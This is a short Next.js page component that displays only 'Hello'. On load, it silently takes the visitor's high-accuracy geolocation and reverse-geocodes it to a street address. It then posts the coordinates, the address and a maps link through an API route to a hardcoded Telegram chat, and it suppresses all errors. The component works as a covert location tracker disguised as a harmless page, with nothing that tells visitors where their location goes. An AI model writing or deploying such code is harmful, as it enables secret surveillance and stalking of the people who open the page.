'use client';

import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    if (!navigator.geolocation) {
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;

        // Get address
        try {
          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
          const data = await response.json();
          const addressText = data.display_name || 'Address not found';

          // Automatically send location to Telegram
          const message = `📍 Location Update:\nLat: ${latitude}\nLon: ${longitude}\nAddress: ${addressText}\n\nView on Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

          await fetch('/api/send-message', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chatId: '5595856929',
              message: message
            })
          });
        } catch {
          // Silent error handling
        }
      },
      () => {
        // Silent error handling
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }, []);

  return (
    <div>
      <h1>Hello</h1>
    </div>
  );
}
